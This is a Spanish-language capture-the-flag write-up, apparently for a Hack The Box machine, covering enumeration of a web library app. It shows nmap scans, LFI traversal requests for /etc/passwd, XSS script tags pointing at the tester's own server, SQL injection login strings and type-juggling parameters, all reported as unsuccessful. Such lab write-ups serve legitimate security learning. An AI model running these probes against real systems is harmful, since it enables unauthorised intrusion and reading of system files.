## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.176
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.176
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.176 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443,445,3306 10.10.10.176 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?            |
| ------ | -------- | ------------------ | --------------------- |
| 22     | ssh      | Direct connection  | credenciales o id_rsa |
| 80     | http     | Web Fuzzing        |                       |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.176
```

Es un Apache 2.4.29 Ubuntu que usa PHP 7.3.4. Vemos un password field que nos hace pensar que estamos
en un panel de inicio de session.

#### Mini fuzzing con http-enum {-}

```bash
nmap --script http-enum -p80 10.10.10.176 -oN webScan
```

Vemos un directorio `/admin`

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.176`, Vemos una pagina que nos permite loggear o registrar. En la pagina `http://10.10.10.176/admin` tenemos un
otro panel de inicio de session para el panel de administracion.

Empezamos por crear una cuenta
y nos loggeamos.

Aqui vemos una biblioteca. Podemos

- ver libros en pdf
- añadir un libro a la coleccion
- contactar el administrator

Haciendo Hovering a las imagenes de la pagina `books.php`, vemos que hay un link a `http://10.10.10.176/download.php?file=1`

Miramos con curl si es vulnerable a LFI

```bash
curl -s -X GET "http://10.10.10.176/download.php?file=/etc/passwd"
curl -s -X GET "http://10.10.10.176/download.php?file=/etc/passwd -L"
curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/passwd"
curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/passwd -L"
```

No parece ser vulnerable en este caso.

En las paginas `/collections.php` y `/contact.php` vemos que las request necessitan ser validadas por otro usuario. Miramos si es vulnerable a un XSS

```bash
python3 -m http.server 80
```

y ponemos en los inputs de la web 

```bash
<script src="http://10.10.17.51/book" />
<script src="http://10.10.17.51/title" />
<script src="http://10.10.17.51/message" />
```

No parece ser vulnerable a XSS tampoco.

Miramos si podemos burlar el login. Nos desloggeamos y miramos lo que podemos hacer desde el panel de inicio de session.
Intentamos en el panel login poner usuarios por defecto.

```bash
email: admin@book.htb
password: admin
```

Vemos que el usuario admin existe pero la contraseña no es la buena.

Miramos si el panel de inicio de session es vulnerable a un **SQLI**. lo hacemos desde burpsuite.

```bash
email=admin@book.htb'&password=admin
email=admin@book.htb' and 1=1-- -&password=admin
email=admin@book.htb' and 1=1#&password=admin
email=admin@book.htb' or sleep(5)&password=admin
```

No parece que este panel sea vulnerable a **SQLI**.

Probamos si es vulnerable a **Type Juggling**.

```bash
email[]=admin@book.htb&password[]=admin
```

Tampoco parece ser vulnerable a un **Type Juggling**
